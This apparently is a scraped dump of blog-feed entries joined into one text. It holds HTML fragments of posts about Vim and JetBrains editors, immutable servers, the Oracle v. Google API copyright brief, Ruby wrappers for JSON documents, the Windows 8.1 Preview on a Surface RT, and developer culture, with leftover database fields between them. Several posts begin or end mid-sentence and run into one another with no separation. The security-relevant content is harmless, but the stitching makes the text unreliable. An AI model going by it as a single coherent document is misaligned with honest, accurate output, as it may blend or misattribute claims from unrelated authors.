Code, email, docs - whatever. One of the biggestefficiency gains you can achieve is to<strong>become a faster editor</strong>. This is what Vim does best: help you edit Faster, Better, Stronger - and you can carry these skills with you to almost any editor available today.</p><p>Notice I didn't say that Vim makes you a\"faster typer\" - no a faster Editor. Modern IDEs have focused on that of late - and no one is better at it than JetBrains.</p><p>For the last 4 months I've been using<a href=\"http://www.jetbrains.com/ruby/\">RubyMine</a>and<a href=\"http://www.jetbrains.com/webstorm\">WebStorm</a>and have fallen in love with them. WebStorm especially - if you're a Javascript person (Node or whatever) - it's a great deal at $49.</p><p><img src=\"http://www.jetbrains.com/webstorm/whatsnew/screenshots/60/html5outline.png\" alt=\"WebStorm\"></p><p>I'm not an intellisense person (since moving my focus away from .NET) but I do find it extremely helpful when working with new libraries. For instance: the Angular plugin for WebStorm helped me explore many of the\"ng-\" tags that I would not have seen otherwise.</p><p><img src=\"/images/angular-plugin.png\" alt=\"Angular Plugin\"></p><p>In the<a href=\"http://tekpub.com/productions/angular\">Tekpub Angular Series</a>I've been using WebStorm exlclusively and I've really enjoyed it.</p><p>Both RubyMine and WebStorms have interesting navigation schemes (I think this extends to Resharper for VS too):</p><ul><li>Cmd-O allows you to search by a class name</li><li>Cmd-Shift-O allows you to search by file name</li><li>Cmd-Option-O allows you to search by symbol (a method name, for instance)</li><li>Cmd-B takes you to a class or method declaration directly</li><li>In the gutter of a Rails project are\"go to view\" (when you're in a Controller) and\"go to Controller\" when you're in a view</li><li>Cmd-E opens a popup of recently edited files</li></ul><p>Really helpful stuff. In addition there are some great inspection features that offer\"squigglies\" (as Hanselman calls them) when methods aren't found, script files don't exist, etc. If you trust it - the editor will also give you refactoring options for your code...</p><p>These are helpful features - but are they helping me edit code faster? In some ways yes... in other ways...</p><h2>Enter Vim</h2><p><a href=\"http://codeofrob.com\">Rob Ashton</a>was out here in Hawaii visiting recently and he is a devoted Vim user. I was showing him WebStorm and all the neat things that go with it - but both of us agreed that we could code faster in Vim.</p><p><i><strong>Note</strong>: I know there are Vim plugins for JetBrains bits (and most other IDEs) - I'll get there.</i></p><p>While recording a video<a href=\"http://us2.campaign-archive1.com/?u=5e6e923ae72e1d1815a5df825&id=40b9d577bd&e=\">for our upcoming\"Career Reboot\" production at Tekpub</a>, I asked Rob\"what tools do you take with you while you hop the globe, journeyman coding\"?</p><p><img src=\"/images/reboot.jpg\" alt=\"Tekpub's Career Reboot\"></p><p>For the last year or so<strong>Rob has been travelling the planet</strong>, working on various projects for a few weeks at a time. His experiment was a simple one:</p><blockquote><p>Pay for my travel, lodging and food and I'll do the work for free</p></blockquote><p>With him was<strong>a single bag for his clothes and a backpack with 2 computers</strong>. He gave up his house and all of his furniture and put a few small things in storage and then set out - ending his journey here in Hawaii.</p><p>His work was varied and he wasn't sure for than a month at a time where he'd be next. Aside from the practical aspect - how do you prepare your machine for working in projects ranging from .NET to C++, Ruby to JavaScript. Rob hate's VMs as well - preferring to work on the native OS.</p><p><strong>He has one Windows Machine and one Mac</strong>. He wiped OSX off his Mac, however, and installed Ubuntu...</p><p>So what does Rob rely on for writing code?</p><blockquote><p>Vim</p></blockquote><p>For much of the code he writes, Vim will suffice, everytime. He can load up any set of plugins he needs to write effectively in Ruby, Javascript or Python. He knows the commands well and to watch him use the editor is a fascinating treat.</p><p>When working in Visual Studio, he uses<a href=\"http://visualstudiogallery.msdn.microsoft.com/59ca71b3-a4a3-46ca-8fe1-0e90e3f79329\">the VsVim plugin</a>and, according to him:</p><blockquote><p>If I didn't have these Vim plugins for VisualStudio I'd be screwed</p></blockquote><p>Most IDEs have a Vim\"overlay\". All of the JetBrains IDEs do, and so does SublimeText and ... well just about any editor you can think of.</p><h2>Vim, Everywhere</h2><p><strong>In terms of editing code, Vim won.</strong>The eternal Vim/Emacs war will rage on forever - but I don't think anyone can argue that,<strong>in terms of pure editing power: Vim does what it does, extremely well</strong>.</p><p>From your new shiny Mac Air to the Linux box in the cloud somewhere: open the terminal and hit\"vim\" and it's likely there, ready to edit config files or code.<strong>Vim is the Alpha and Omega editor</strong>- the beginning and the end.<strong>Vim is everywhere</strong>.</p><p><em>So it's back to Vim for me</em>. I like the JetBrains tools and I enjoy SublimeText 2 a lot... but I can move and edit in Vim at twice the speed.</p><p>You might be wondering:<strong>\"why not just use a Vim plugin dude?\"</strong></p><p>The inspections, plugins and\"helper\" functions in the JetBrains tools are interesting and helpful,<strong>but they come at a price</strong>(to me).

Each time you want a new update you modifythe base instance and run it through an automated test harness. You onlycreate new servers when they pass these steps.</p><p>So a phoenix server's complete state is built from a combinationof base image + automated configuration management + data<a href=\"#footnote-data\">[1]</a>, which reduces the pressure to have automatedconfiguration manage 100% of the server.</p><p>But while we can continue to run configuration management updateson a server during its brief lifetime, there's less value in doingso.

Any changes thatare needed can be made to the base image, tested, and then rolledout. Servers without the change are torn down and replaced.</p><p>If this sounds familiar, it's because it follows the practices of<a href=\"/articles/continuousIntegration.html\">ContinuousIntegration</a>and<a href=\"http://martinfowler.com/bliki/ContinuousDelivery.html\">ContinuousDelivery</a>. WithContinuous Delivery of software, it's safer to compile a given version ofan application into a deployable artifact only once, and know that you aredeploying and running a consistently built application in all environments.With an immutable server, you make each change to a base image, and thenyou know that all instances created from that image are consistent.</p><p>The main differences between instances of a server role come fromconfiguration settings, which should come from outside the server.For example, most virtualization and cloud platforms offer a way toset metadata values when provisioning a new instance, which can thenbe read by the running server. New servers may also pullconfiguration values from a central registry like<a href=\"http://zookeeper.apache.org/\">Zookeeper</a>.</p><p>It's advisable to minimize the number and scope of per-instanceconfiguration items for immutable servers, and to run changes tothese through automated testing where feasible.</p><hr class=\"topSection\"/><h2 id=\"HandlingData\">Handling data</h2><p>If servers are disposable, the data that lives on them often is not.When implementing phoenix or immutable servers you should consider whatdata needs to be persisted as servers are destroyed and created, and whatdata must be replicated in order to scale by adding additional servers.</p><p>You can ship data off of the instance when it has value but isn't neededat runtime, for example sending logfiles to a central syslog server. A sharedfile system like NFS can make files available to servers, perhaps living ona SAN. Cloud platforms generally offer mountable storage devices like AWSEBS volumes which can be attached to new servers instances when the old onesare destroyed, or quickly duplicated and attached to replicas when scaling acluster. Often you can pass the buck to a service which someone else maintains,like Amazon's RDS database service.</p><div class=\"furtherReading\"><h2>Further Reading</h2><p>Netflix has been at the forefront in using the ImmutableServerpattern, although I'm not aware that they've used the term.

Teams apply the 80/20 rule to automated configuration,focusing 80% (or more like 95%) of their attention on defining that20% (or 5%) of the system which is most relevant to their particularneeds, leaving the rest to the defaults installed by the base OS.

The brief isa statement on behalf programmers who oppose the copyrighting ofAPIs. I'm one of the signatories to the amicus brief.</p><p>The software industry has long had a complicated relationship withintellectual property law. It's long been held that source code canbe protected by copyright, preventing someone from just copyingsomeone else's program without their consent. On the whole I'm infavor of using copyright in this way - as one who writes a lot ofprose describing software development, the mechanism seems to fitwell.</p><p>But that fit breaks down when it comes to interfaces of softwarecomponents. The whole point of components, as I see it, is that theyrepresent software elements that are independently replaceable andupgradeable<a href=\"#footnote-component\">[1]</a>. Breaking down softwaresystems into components allows competition to develop, as differentgroups compete with better or cheaper components. For this to work,components need to have common interfaces, which raises the questionof how such interfaces can develop.</p><p>So far common interfaces mostly appear by interfaces becomingwidely used and then widely copied. This can be intentionally, withcomponent authors documenting their interfaces, orby reverse engineering of closed interfaces. Reverse engineering ofclosed interfaces has played a vital role in the development ofsoftware systems we use today - the amicus brief describes examplessuch as various elements of Unix, the BIOS of the IBM PC, and theSMB protocol for network sharing of hard drives.</p><p>This background was challenged recently<a href=\"http://en.wikipedia.org/wiki/Oracle_v._Google\">by a case</a>brought by Oracle against Google's use of Java for Android. Thereare<a href=\"http://arstechnica.com/series/series-oracle-v-google/\">a number ofparts to this case</a>, but a key question was whether the API tocore java libraries was copyrightable. Last year a<a href=\"http://arstechnica.com/tech-policy/2012/05/google-wins-crucial-api-ruling-oracles-case-decimated/\">federaldistrict court ruled</a>that APIs were not copyrightable. Oracle isappealing against this, the amicus brief that we signed wasorganized by the EFF to uphold the district court's ruling.</p><p>I am not opposed to intellectual property in general, or the useof copyright for software. I do think it's reasonable for softwaredevelopers to be able to protect their hard work through the courseof an admittedly imperfect legal system. Nor do I deny thatdesigning a good API is significant intellectual work. But likeeverything else in property law, it's about balancing interests.Copyrightable APIs would erect considerable barriers to innovationand competition, further limiting the ability of new entrants todisrupt markets and improve the software ecosystem. This threat isnot a small one, and I'm happy to play a small part in opposingit.</p><div class=\"footnote-list\"><h2>Notes</h2><div class=\"footnote-list-item\" id=\"footnote-component\"><p><span class=\"num\">1:</span>I took this definition from Ralph Johnson</p></div></div>","author":false,"_id":{"$wrap":"$oid","v":1187}}

JSON documents can also be served directlyto web browsers or used to transfer data to server-side pagerenderers. When JSON is being used in this way, I hear people sayingthat using an object-oriented language gets in the way because theJSON needs to be translated into objects only to be rendered outagain - a waste of programming effort<a href=\"#footnote-effort\">[1]</a>. I agreewith the point about waste, but I argue that it's not a problem with objects buta failure to understand encapsulation.</p><p>Let's imagine we're storing an order as a JSON document andserving it up with minor server-side processing, again as JSON. Anexample document might be like this.</p><pre>{ \"id\": 1234,\"customer\": \"martin\",\"items\": [{\"product\": \"talisker\", \"quantity\": 500},{\"product\": \"macallan\", \"quantity\": 800},{\"product\": \"ledaig\",   \"quantity\": 1100}],\"deliveries\": [{ \"id\": 7722,\"shipDate\": \"2013-04-19\",\"items\": [{\"product\": \"talisker\", \"quantity\": 300},{\"product\": \"ledaig\",   \"quantity\": 500}]},{ \"id\": 6533,\"shipDate\": \"2013-04-18\",\"items\": [{\"product\": \"talisker\", \"quantity\": 200},{\"product\": \"ledaig\",   \"quantity\": 300},{\"product\": \"macallan\", \"quantity\": 300}]}]}</pre><p>We'll assume we haven't got much server-side processing to do, but we do havesome. Let's also assume we're using an OO language. A naive approachmight be to read in the JSON document, convert the data to theappropriate object graph (with orders, line-items, and deliveries),apply any processing, and then serialize the object graph to JSONfor the client.</p><p>In many of these situtiations a better way to proceed is to keepthe data in a JSONish form, but still wrap it with objects tocoordinate manipulation. Most programming environments providegeneric libraries that take a document and deserialize it to genericdata structures. So a JSON document would deserialize to a structureof lists and dictionaries, an xml document to a tree of xml nodes.We can then take this generic data structure and put it into a fieldof an order object - here's an example with Ruby and JSON.</p><pre>class Order...def initialize jsonDocument@data = JSON.parse(jsonDocument)end</pre><p>When we want to manipulate the data, we can define methods on theobject as usual, and implement them by accessing this data structre.</p><pre>class Order...def customer@data['customer']enddef quantity_for aProductitem = @data['items'].detect{|i| aProduct == i['product']}return item ? item['quantity'] : 0end</pre><p>This includes cases with more complex logic.<a href=\"#footnote-collection-lambda\">[2]</a></p><pre>class Order...def outstanding_delivery_for aProductdelivered_amount = @data['deliveries'].map{|d| d['items']}.flatten.select{|d| aProduct == d['product']}.inject(0){|res, d| res += d['quantity']}return quantity_for(aProduct) - delivered_amountend</pre><p>The embedded document can be enriched before sending to the client.</p><pre>class Order...def enrich@data['earliestShipDate'] =@data['deliveries'].map{|d| Date.parse(d['shipDate'])}.min.to_send</pre><p>If needed, you can form similar objects on sub-trees of theembedded document.</p><pre>class Order...def deliveries@data['deliveries'].map{|d| Delivery.new(d)}end</pre><pre>class Delivery...def initialize hash@data = hashenddef ship_dateDate.parse(@data['shipDate'])end</pre><p>One thing be wary of here is that such object wrappers aren'tquite the same as normal objects. The delivery objects returned inthe above code fragment don't have the same equality semantics thatyou'd expect from objects arranged in the more usual structure.</p><p>Despite its compartive rareity, an embedded document fits wellwith object-orientation. The point of encapsulated data is thehiding of the data structure, so that users of the object don't know or care aboutthe internal structure of the order.</p><p>Those familiar with functional programming will recognize thestyle of flowing a generic data structure through a series offunctions - you can think of the object as providing a namespace formanipulating the generic data stuctures.</p><p>The sweet spot for an embedded document is when you're providingthe document in the same form that you get it from the data store,but still want to do some manipulation of that data. If you don'thave any need to access the contents of the JSON document, thenthere's no need to even deserialize it into a generic datastructure. The order object needs only a constructor and a method toreturn its JSON representaiton. On the other hand as you do morework on the data - more server side logic, transforming intodifferent representations - then it's worth considering whether it'seasier to turn the data into an object graph.</p><div class=\"footnote-list\"><h2>Notes</h2><div class=\"footnote-list-item\" id=\"footnote-effort\"><p><span class=\"num\">1:</span>Some might argue it's a waste of computing effort too - althoughI would be surprised if it were significant.

It's a one-way upgrade (meaning you won't be able to go from this Preview Build to the final) so make a Recovery Drive with a USB drive you have lying around. You'll need at least a 4GB USB key for this backup and the drive will be erased. Then go to<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~preview.windows.com\">http://preview.windows.com</a>and follow the instructions. Basically you download an update, install, reboot, and then the Windows Store says Windows 8.1 Preview is available. You install for a while (took a few hours) and assuming you're signed in with the same Microsoft Account it will redownload all your apps.</p><blockquote><p><strong>Warning</strong>: Installing anything called\"preview\"is for advanced/enthusiast folks. Expect nothing and you'll never be disappointed. Backup your crap. Be prepared to torch your machine to get back to the mainline.</p></blockquote><p>I honestly didn't use my Surface RT that much, mostly just for Movies and Stuff, but this new 8.1 update adds some stuff that will have me using it around the house more.</p><p>Here's 10 features that are making me look harder at Windows 8.1.</p><h3>Being able to use your Desktop Wallpaper as your Start Menu background</h3><p>The Start Button is back, down there in the corner. But that's not as interesting to me as the ability to use your Desktop wallpaper as your Start Menu background. This might be hard to visualize, but the point is that if you hit the Start Button (or the Windows Key) you'll immediately move to the big Start Menu. When the background of that menu is your same desktop wallpaper, the result is much less jarring than a bright background and makes the whole Windows 8.x experience much more comforting.</p><p><img title=\"Windows 8.1\"style=\"display: inline\"alt=\"Windows 8.1\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(1)_3.png\"width=\"720\"height=\"405\"></p><p><img title=\"Using the Desktop Wallpaper as my Start Screen background\"style=\"display: inline\"alt=\"Using the Desktop Wallpaper as my Start Screen background\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(2)_3.png\"width=\"720\"height=\"405\"></p><p>From the Start Menu, hit Windows-C, click Settings, then Personalization. You'll see the menu fly out as in the picture below. Select the tiny thumbnail of your wallpaper. It's the square with the birds in my picture here.</p><p><img title=\"Screenshot (5)\"style=\"display: inline\"alt=\"Screenshot (5)\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(5)_9.png\"width=\"720\"height=\"405\"></p><p>This little change is a huge difference. I wish this was the default experience, myself.</p><h3>Search Everywhere</h3><p>If you are in the Start Screen and you start typing it will search everything. Apps, Files and the Internet if you want. If you search for a Well Known Thing (caps mine) then it will give you detailed results that include (possibly) music, big pics, videos, etc. I searched for Daft Punk below.</p><p><img title=\"Screenshot (3)\"style=\"display: inline\"alt=\"Screenshot (3)\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(3)_3.png\"width=\"720\"height=\"405\"></p><h3>Freaking Outlook 2013</h3><p>Since my Surface RT includes Office RT (Word, Excel, PointPoint, etc) it looks like Windows 8.1 adds Outlook 2013 RT to the mix! This was a total surprise to me, and is the #1 reason I'll start using my Surface for work stuff. I'm surprised this hasn't been noticed by some of the tech sites I read. It's an awesome addition.</p><p><img title=\"Outlook 2013 RT\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Outlook 2013 RT\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(4)_3.png\"width=\"722\"height=\"407\"></p><h3>Smarter Windowing</h3><p>Windows 8.1 seems much smarter about making decisions about window management. Here I've launched the Games app while running the Mail app on the left and the Desktop on the right. it's hovering (teetering, even) in the middle, waiting to be pulled from one side to the other, rather than just taking over one of my existing apps.</p><p>Apps can be 50/50 split on the Surface RT, as well as the other 70/30 options.</p><p><img title=\"Screenshot (6)\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Screenshot (6)\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(6)_3.png\"width=\"722\"height=\"407\"></p><h3>Way easier customization</h3><p>Icons are moved more like on my other tablets, with a push and hold gesture. Except you can select multiple icons, start dragging them with one figure while<em>scrolling with the other finger</em>. Grouping and customizing is way easier.</p><p>Here is me starting to move things around. I've got the Office stuff tiny, and the News app largest.</p><p> <img title=\"Moving my start screen around\"style=\"display: inline\"alt=\"Moving my start screen around\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(8)_3.png\"width=\"720\"height=\"405\"></p><h3>Better All Apps View</h3><p>Apps that are newly installed get marked\"new\"in the All Apps few. You swipe down from the Start Menu to get here, and can sort by Recently Installed as well. I found a bunch of new apps I hadn't seen before like Calculator, Sound Recorder, Health and Fitness and Alarms.</p><p><img title=\"All Apps View\"style=\"display: inline\"alt=\"All Apps View\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(9)_3.png\"width=\"720\"height=\"405\"></p><h3>More Comprehensive Settings</h3><p>The Settings area has a LOT more info than before, including some rather deep pages (you may have to hunt) like this one on my Wi-Fi Router. Note that it's marked as a Meter Connection. I thought it was cool that Outlook didn't connect automatically when this was marked as Metered (this means my router has limited data and I could be charged for big downloads). I have personally downloaded gigs of mail while overseas and gotten nailed by big bills, so this was cool.</p><p>The Metering is an existing feature, but the deeper details into my Wi-Fi and devices is new.</p><p><img title=\"Better Wi-Fi\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Better Wi-Fi\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(10)_3.png\"width=\"722\"height=\"407\"></p><h3>Removable Disks in your Music and Video Libraries</h3><p>I'm pretty sure this wasn't there before. I added a 64gig micro-SD to my Surface RT with the plan to watch Videos and store Photos on it, but it wasn't very seamless in Windows 8. I took a chance and right clicked on my SD card folders and said\"Include in Library\"and now my videos show up in the Videos app! Suddenly my 32-gig Surface has become a more useful 96 gig machine (well, 64-gig, as I'm going to change the defaults to store everything on my SD card.)</p><p><img title=\"Removeable disks in libraries\"style=\"display: inline\"alt=\"Removeable disks in libraries\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(11)_3.png\"width=\"720\"height=\"405\"></p><p>Here's my videos listed, some in the cloud and some on my micro SD card.</p><p><img title=\"My videos from the SD Card\"style=\"display: inline\"alt=\"My videos from the SD Card\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(12)_3.png\"width=\"720\"height=\"405\"></p><p>Here I am looking at Outlook while watching Harry Potter in Split-Screen.</p><p><img title=\"Outlook plus Harry Potter\"style=\"display: inline\"alt=\"Outlook plus Harry Potter\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(14)_3.png\"width=\"720\"height=\"405\"></p><h3>Smarter Notifications and Quiet Hours</h3><p>My wife is NOT a fan of my Surface RT for one basic reason. It won't stop beeping. I installed Twitter and Twitter\"pops toast\"- meaning, it uses notifications - and it's forever going off and beeping at night. Yes, I could turn off notifications, or sleep it, and I do, but when I'm using the thing I want it on. The Notifications options have been expanded to include\"quiet hours,\"which is a nice touch.</p><p><img title=\"Quiet Hours\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Quiet Hours\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(18)_3.png\"width=\"722\"height=\"407\"></p><h3>The Reading List</h3><p>I'm a big fan of Instapaper and the idea of a\"Read It Later\"gesture. This is different from simply bookmarking. This is a queue of long-form reading material. From apps like Internet Explorer you can invoke the\"Share\"action. I could share to Twitter, Mail, some People, or the new Reading List.</p><p><img title=\"Sharing to Reading List\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Sharing to Reading List\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(15)_3.png\"width=\"722\"height=\"407\"></p><p>Then I click to Share, and later on go to my Reading List (now pinned to my Start Screen) and go read my long form articles. I haven't checked but I'm presuming this list would be persisted transparently across all my machines.</p><p><img title=\"Reading from the Reading List\"style=\"display: inline\"alt=\"Reading from the Reading List\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Windows-8.1-Preview-on-a-Surface-RT_14A08/Screenshot%20(17)_3.png\"width=\"720\"height=\"405\"></p><hr><p><strong>Sponsor:</strong>Big thanks to CodeProject for sponsoring the feed this week!

A lot of us have felt that way. I certainly have as well a few times in the past. The 2 most common excuses you'll hear for not believing something can work are:</p><ol><li><p>The people I work with aren't good/talented/disciplined enough to make this work.</p></li><li><p>It can't possibly work in our organization.</p></li></ol><p>The truth though, is that it's actually because of <em>you</em>. Whenever you say \"that won't work for us\" or something similar because of the people you work with, you immediately show your lack of faith in them. You might think that that lack of faith is justified, but that basically means you've given up all hope of making things better. You know it, and worst of all, <em>they know it too</em>. People who aren't trusted by their coworkers or superiors generally pick up on that rather quickly. Some of them will respond by putting in more effort and trying to do better. Others will become demotivated and wonder why they should even try because \"it's never good enough anyway\". At this point, your lack of trust in your coworkers becomes a self-fulfilling prophecy.</p><p>You might want to consider another approach. Think back on how you've responded to situations where you where challenged by coworkers or superiors but where it was clear that they trusted you and believed that you were capable of doing a better job. I'd bet that for most of you, it improved your motivation and your willingness to do better. It probably helped you bring out the best in you. You can use this to your advantage when you're trying to get better results out of your coworkers. It's quite simple really: it's all about how you approach someone. If you want somebody to do better, and you approach them in a positive manner you're much more likely to get better results. If however, they sense your distrust (and most people pick up on that quite easily), they will most likely be defensive or apprehensive. The odds are quite low that something good will come out of that.</p><p>If you want people to improve and do better, it's important to establish a culture where everybody knows that it's <em>ok</em> to make mistakes, and that every mistake is an opportunity for the whole team to get better. If that's not the case in your situation, what is preventing you from trying to get to that point? Even if you're not officially in a leadership position, there's no reason why you can't set the tone and <em>be a leader</em>. Start making an impact on one or two people and build off of that growth. Once you've got a few people convinced, it's much easier to bring the rest along with you. You don't need to shoot for the stars from the beginning either. Try to improve whatever it is you think needs improvement with small steps, in an iterative approach. Instead of thinking \"that will never work for my team\", think \"we're not quite ready for that <em>yet</em>, but we will be someday\".</p><p>If you believe you can't improve your way of working due to organizational reasons, it's important to also start with your team. It's easy for management to ignore the opinion of one person, but it gets progressively harder for them to ignore it as more and more people start asking for change. It's much easier to persuade management to try something new if you can show that the whole team believes it's worth a shot. Keep pressing the issue until you get the chance to try it for a short time. If you keep asking for it, management might just get tired of hearing it and who knows, they'll grant you some time to try it out. You'll never know if you stop trying.</p><p>Of course, you won't always succeed in convincing management or your coworkers. But you've gotta try. And if you keep hitting walls, you might actually be better off moving on to another job with other people instead of being frustrated in your current position. Even if you don't agree with what I'm saying in this post, you can't possibly disagree with this: not trying will get you nowhere.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=vmRCqUkdXLU:0dHmB8pfeyA:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=vmRCqUkdXLU:0dHmB8pfeyA:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/vmRCqUkdXLU\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1197}}

The second time you do something similar, you wince at the duplication, but you do the duplicate thing anyway. The third time you do something similar, you refactor.</p></blockquote><p>That's a quote from Don Roberts, found in Martin Fowler's Refactoring book (page 58). That quote didn't really make me think twice at the time I read it, but it got stuck in my head later on when I heard it from someone who's always been very influential to me. When this person told me that this was one of his favorite rules, I was still in my \"no way dude, all code needs to be as clean as it can be\" phase. But it's really grown on me over the last few years. Now, just to avoid any confusion: this post is about <em>my interpretation</em> of 'Three Strikes And You Refactor', not about what may have been originally intended or what some people think of it now.</p><p>The most important thing I remember when learning about TDD was:</p><ol><li><p>Write a failing test</p></li><li><p>Do the simplest thing that could possibly work to make the test pass.</p></li><li><p>Refactor.</p></li></ol><p>With all the literature that's out there, as well as popular opinion on how important clean code is, it's tempting to go overboard with that 'refactor' step. It's tempting to go for the solution that is crispy clean. The solution that'll have your coworkers or peers go \"ohhh, now <em>that</em> is nice\". However, you really need to ask yourself the following question: \"is it really worth it?\". Wanting to make sure that every piece of code is perfect takes up a lot of time, and I've learned that it certainly isn't always worth it. Besides, it's quite easy to go off on a path of introducing new concepts and abstractions to your code that end up being totally unnecessary. If this increases complexity in parts that don't really matter, it ends up being a huge waste. Not only for the person who wrote it, but for every person who has to read it and comprehend it later on.</p><p>'Three Strikes And You Refactor' is a helpful rule of thumb here. Try to keep things as simple as possible and don't be afraid of a <em>little</em> duplication here or there. Once you find yourself (or a teammate) doing the same thing for a third time, it's worth cleaning up because that third time very often means that it wouldn't be the last time either. This way, you only introduce concepts and abstractions that are really needed, and enables you to avoid adding unnecessary cruft to the code.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OFSdEDuJMHc:gDoJMj70oqo:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OFSdEDuJMHc:gDoJMj70oqo:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/OFSdEDuJMHc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1200}}

Be sure to read it if you haven't, because it's got some very good points, though I don't like the dig at people who contribute to open source since these people are having an ever increasing positive impact on our jobs. Anyways, the manifesto is about being a software developer without being defined by it. I actually think it's a healthy point of view.</p><p>I've always disagreed with this seemingly popular point of view or opinion that every developer should spend a lot of time outside of his/her working hours blogging or publishing their code on Github or contributing to open source. Those activities <em>can</em> be important but aren't necessarily so and the people doing them aren't inherently more valuable or important than developers who choose not to contribute to open source software or who don't feel the need to make a name for themselves. I also disagree with the notions that developers who are only involved with software development during their 8 working hours a day must be inferior or that they can't be passionate about it or that they'll never be great at it or any of that other crap that you'll sometimes hear people say.</p><p>I know some great developers who put their code out there and/or their thoughts by blogging. I also know some bad developers who put their code out there and/or their thoughts by blogging. I know some great developers who aren't involved with software development outside their working hours. I also know some bad developers who aren't involved with software development outside their working hours. There are good and bad developers on both sides of every situation you can come up with.</p><p>I think it depends a lot on what people do <em>during their 8 working hours</em>. Can we really say that developers who work 8 hours a day on challenging projects with strong co-workers in teams where knowledge is passed around continuously are missing out 